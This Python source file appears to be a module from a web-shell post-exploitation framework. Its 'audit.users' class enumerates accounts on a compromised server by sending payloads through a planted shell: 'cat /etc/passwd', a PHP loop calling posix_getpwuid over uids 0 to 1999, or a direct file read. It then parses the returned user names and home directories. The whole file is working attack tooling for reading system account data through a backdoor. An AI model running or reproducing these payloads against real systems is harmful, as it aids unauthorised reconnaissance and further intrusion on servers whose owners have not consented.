'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException

classname = 'Users'
    
    
class User:
    
    def __init__(self,line):
           
        linesplit = line.split(':')
        
        self.line = line
        self.name = linesplit[0]
        
        if len(linesplit) > 5 and linesplit[5]:
            self.home = linesplit[5]
        else:
            self.home = '/home/' + self.name
            
    
class Users(Module):
    """Enumerate users and /etc/passwd content
    :audit.users 
    """
    
    vectors = { 
               'shell.sh' : { "cat"       : "cat %s"
                },
               
               'shell.php' : { 
                              "posix_getpwuid" : "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }",
                              },
               'file.read' : {
                              "file.read" : "%s"
                              }
    }
    

    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.usersinfo = {}
        
                
    def run(self):
        
        
        for interpreter in self.vectors:
            for vector in self.vectors[interpreter]:
                if interpreter in self.modhandler.loaded_shells or interpreter == 'file.read':
                    payload = self.vectors[interpreter][vector] 
                    
                    if self.vectors[interpreter][vector].count('%s') == 1:
                        payload = payload % ('/etc/passwd')
                
                    try:    
                        response = self.modhandler.load(interpreter).run(payload)
                    except ModuleException:
                        response = None
                        
                            
    
                    if response and ':0:0:' in response:
                        
                        self.mprint("[%s] Enumerating user using method '%s'" % (self.name, vector))
                        
                        for line in response.split('\n'):
                            if line:
                                user = User(line)
                                self.usersinfo[user]=user
                        
                        return response

        raise ModuleException(self.name,  "Users enumeration failed")
        


    
    
    